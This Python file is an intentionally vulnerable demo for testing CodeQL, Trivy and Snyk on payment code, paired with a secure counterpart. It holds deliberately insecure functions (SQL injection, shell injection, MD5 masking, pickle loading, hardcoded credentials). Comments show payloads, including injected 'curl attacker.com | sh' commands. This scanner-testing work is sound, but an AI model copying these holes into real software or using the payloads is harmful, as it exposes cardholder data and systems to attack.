# INTENTIONALLY VULNERABLE — demo/negative test case only.
# DO NOT import or deploy this code anywhere.
#
# Purpose: demonstrate that CodeQL SAST and Trivy secret scanning catch real vulnerability
# classes before they reach production. Five CWE categories relevant to PCI-DSS payments.
#
# What catches each issue:
#   Trivy fs --scanners secret  →  CWE-798 (hardcoded credentials)
#   CodeQL (SAST / GitHub Actions) →  CWE-89, CWE-78, CWE-327, CWE-502
#   Snyk DeepCode            →  all five + licence checks
#
# Local demo (no cluster needed):
#   trivy fs --scanners secret demo/insecure-code/vulnerable_payment.py
#   # Expected: CRITICAL finding — API key / hardcoded credential detected
#
# CodeQL results appear as inline PR annotations in the GitHub Security tab.
# See .github/workflows/ci.yaml — codeql job.
#
# Compare every function below to demo/insecure-code/secure_payment.py.

import sqlite3
import os
import hashlib
import pickle


# ─── CWE-798: Hardcoded Credentials ─────────────────────────────────────────
# A hardcoded API key committed to git is exposed to anyone with repo access —
# including contractors, third-party CI tools, and anyone who ever clones the repo.
# Trivy secret scan detects the key pattern (Stripe live key format: sk_live_XXXX...)
# and fails the CI build before the image is pushed.
# GitHub Push Protection also blocks the commit at git-push time if a live-format
# key is present — demonstrating defence-in-depth before code even reaches CI.
# PCI-DSS Req 8: all credentials must be unique and rotatable — hardcoded keys can't be.
#
# NOTE: the value below uses a placeholder deliberately — GitHub Push Protection
# blocked the original commit that contained a real-format Stripe key (sk_live_...).
# That's the defence working. Trivy fs --scanners secret still catches the hardcoded
# variable pattern; for a live demo of the full block, add a real-format key locally
# and run: git push — you'll see the same rejection this repo got during development.
PAYMENT_GATEWAY_KEY = "hardcoded_api_key_never_commit_credentials"  # VULNERABLE — CWE-798 (simulates sk_live_... format)
DATABASE_PASSWORD   = "Sup3rS3cr3tPaymentsDB!"                     # VULNERABLE — CWE-798


# ─── CWE-89: SQL Injection ───────────────────────────────────────────────────
# User-controlled input is concatenated directly into the SQL query string.
# Attack payload:  user_id = "' OR '1'='1' --"
# Result: query becomes SELECT * FROM payments WHERE user_id = '' OR '1'='1' --'
# The attacker dumps the entire payments table — all card numbers, amounts, user IDs.
# CodeQL traces the data flow from the function parameter to cursor.execute()
# and flags it as a critical injection vulnerability.
def get_payment_details(user_id):
    conn = sqlite3.connect("payments.db")
    cursor = conn.cursor()
    query = f"SELECT card_number, amount FROM payments WHERE user_id = '{user_id}'"  # VULNERABLE — CWE-89
    cursor.execute(query)
    return cursor.fetchall()


# ─── CWE-78: OS Command Injection ────────────────────────────────────────────
# user-controlled input is passed to a shell command via os.system().
# Attack payload:  report_name = "jan; curl http://attacker.com/exfil | sh"
# Result: the shell executes both commands — the report runs, AND the payload runs.
# CodeQL flags os.system() with unsanitised user input as high severity.
def generate_payment_report(report_name):
    os.system(f"generate_report.sh {report_name}")   # VULNERABLE — CWE-78


# ─── CWE-327: Use of a Broken or Risky Cryptographic Algorithm ───────────────
# MD5 has been cryptographically broken since 2004 (Wang & Yu collision attack).
# Using it to hash or "mask" cardholder data violates PCI-DSS Requirement 3.4
# (render PAN unreadable anywhere it is stored).
# Snyk and CodeQL both flag md5 usage in security-sensitive contexts.
def mask_card_number(card_number: str) -> str:
    return hashlib.md5(card_number.encode()).hexdigest()   # VULNERABLE — CWE-327


# ─── CWE-502: Deserialization of Untrusted Data ──────────────────────────────
# pickle.loads() on attacker-controlled bytes allows arbitrary code execution.
# Exploit:  craft a pickle payload that runs os.system("curl attacker.com | sh")
# The payload executes the moment loads() is called — before any validation.
# Snyk flags pickle with external input as critical; CodeQL traces the taint flow.
def restore_payment_session(session_blob: bytes):
    return pickle.loads(session_blob)   # VULNERABLE — CWE-502
